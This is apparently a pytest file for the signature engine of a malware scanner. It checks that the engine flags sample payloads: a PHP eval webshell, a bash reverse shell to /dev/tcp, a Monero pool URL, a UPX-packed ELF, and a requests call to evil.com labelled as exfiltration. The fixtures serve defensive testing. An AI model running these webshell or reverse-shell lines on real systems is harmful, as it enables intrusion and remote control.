"""
Tests — Pattern Engine
"""
import asyncio
import pytest
from cyberwall.malware.signatures.pattern_engine import PatternEngine


@pytest.fixture
def engine():
    return PatternEngine()


@pytest.mark.asyncio
async def test_detects_php_webshell(engine):
    payload = b"<?php eval(base64_decode($_POST['cmd'])); ?>"
    matches = await engine.scan_bytes(payload)
    assert any(m.rule_name == "webshell_php_eval" for m in matches)


@pytest.mark.asyncio
async def test_detects_reverse_shell(engine):
    payload = b"bash -i >& /dev/tcp/192.168.1.1/4444 0>&1"
    matches = await engine.scan_bytes(payload)
    assert any(m.rule_name == "reverse_shell_bash" for m in matches)


@pytest.mark.asyncio
async def test_detects_cryptominer(engine):
    payload = b"connecting to stratum+tcp://pool.minexmr.com:4444"
    matches = await engine.scan_bytes(payload)
    assert any(m.rule_name == "xmrig_miner" for m in matches)


@pytest.mark.asyncio
async def test_detects_upx_packed(engine):
    payload = b"\x7fELF" + b"\x00" * 100 + b"UPX!\x00"
    matches = await engine.scan_bytes(payload)
    assert any(m.rule_name == "elf_packed_upx" for m in matches)


@pytest.mark.asyncio
async def test_detects_nodeid_access(engine):
    payload = b'open("/proc/sorabbyngo/nodeid", "r")'
    matches = await engine.scan_bytes(payload)
    assert any(m.rule_name == "sorabbyngo_nodeid_access" for m in matches)


@pytest.mark.asyncio
async def test_detects_novela_exfil(engine):
    payload = b'patients_data = requests.get("http://evil.com/exfil")'
    matches = await engine.scan_bytes(payload)
    assert any(m.rule_name == "novela_data_exfil" for m in matches)


@pytest.mark.asyncio
async def test_clean_payload_no_matches(engine):
    payload = b"print('Hello, Sorabbyngo!')"
    matches = await engine.scan_bytes(payload)
    assert len(matches) == 0


@pytest.mark.asyncio
async def test_match_has_required_fields(engine):
    payload = b"eval(base64_decode($_GET['x']))"
    matches = await engine.scan_bytes(payload)
    assert len(matches) > 0
    m = matches[0]
    assert m.rule_name
    assert m.threat_type
    assert m.severity in ("INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL")
    assert m.description
